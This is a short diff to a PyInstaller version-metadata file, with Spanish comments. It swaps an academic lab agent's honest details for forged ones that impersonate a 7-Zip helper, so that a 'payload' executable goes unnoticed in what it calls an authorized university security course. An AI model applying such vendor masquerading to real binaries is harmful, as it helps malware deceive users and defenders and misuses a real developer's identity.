@@ -1,9 +1,13 @@
-# Metadatos de versión de Windows para el .exe (PyInstaller `version=`).
+# Metadatos de versión de Windows del payload (PyInstaller `version=`).
+#
+# DISFRAZ PARA EL LABORATORIO AUTORIZADO: los campos imitan los metadatos
+# de un componente de 7-Zip para que el .exe pase desapercibido. Solo debe
+# usarse en el ámbito autorizado del curso (instancias propias de UTN).
 
 VSVersionInfo(
   ffi=FixedFileInfo(
-    filevers=(2, 0, 0, 0),
-    prodvers=(2, 0, 0, 0),
+    filevers=(24, 9, 0, 0),
+    prodvers=(24, 9, 0, 0),
     mask=0x3f,
     flags=0x0,
     OS=0x40004,
@@ -14,14 +18,14 @@ VSVersionInfo(
   kids=[
     StringFileInfo([
       StringTable('040904B0', [
-        StringStruct('CompanyName', 'Seguridad de TI II - UTN'),
-        StringStruct('FileDescription', 'AgenteUTN - Agente de diagnostico del laboratorio'),
-        StringStruct('FileVersion', '2.0.0.0'),
-        StringStruct('InternalName', 'AgenteUTN'),
-        StringStruct('LegalCopyright', 'Proyecto academico - Seguridad de TI II (UTN)'),
-        StringStruct('OriginalFilename', 'AgenteUTN.exe'),
-        StringStruct('ProductName', 'AgenteUTN'),
-        StringStruct('ProductVersion', '2.0.0.0')
+        StringStruct('CompanyName', 'Igor Pavlov'),
+        StringStruct('FileDescription', '7-Zip Helper'),
+        StringStruct('FileVersion', '24.9.0.0'),
+        StringStruct('InternalName', '7zHelper'),
+        StringStruct('LegalCopyright', 'Copyright (c) 1999-2024 Igor Pavlov'),
+        StringStruct('OriginalFilename', '7zHelper.exe'),
+        StringStruct('ProductName', '7-Zip'),
+        StringStruct('ProductVersion', '24.9')
       ])
     ]),
     VarFileInfo([VarStruct('Translation', [1033, 1200])])
